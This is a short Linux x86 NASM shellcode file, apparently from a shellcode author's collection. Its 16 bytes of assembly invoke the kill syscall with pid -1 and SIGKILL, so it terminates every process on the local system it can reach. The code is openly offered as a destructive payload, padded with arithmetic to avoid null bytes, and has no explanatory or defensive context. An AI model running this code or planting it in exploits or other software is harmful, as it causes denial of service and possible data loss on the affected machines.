;kill-all-processes.nasm
;this kills all processes on the local system
;Linux x86
;Saniv Kawa (@skawasec)
;www.popped.io
;December 6, 2016
;16 bytes

global _start

section .text

_start:

  push byte 9
  mov al, 9  ;arithmetic for AL register
  mov cl, 4 ;arithmetic for AL register
  mul cl ;arithmetic for AL register. AL now contains 36
  inc al ;AL now contains the correct syscall number, 37
  pop ecx ;ECX contains 9
  push byte -1
  pop ebx
  int 0x80
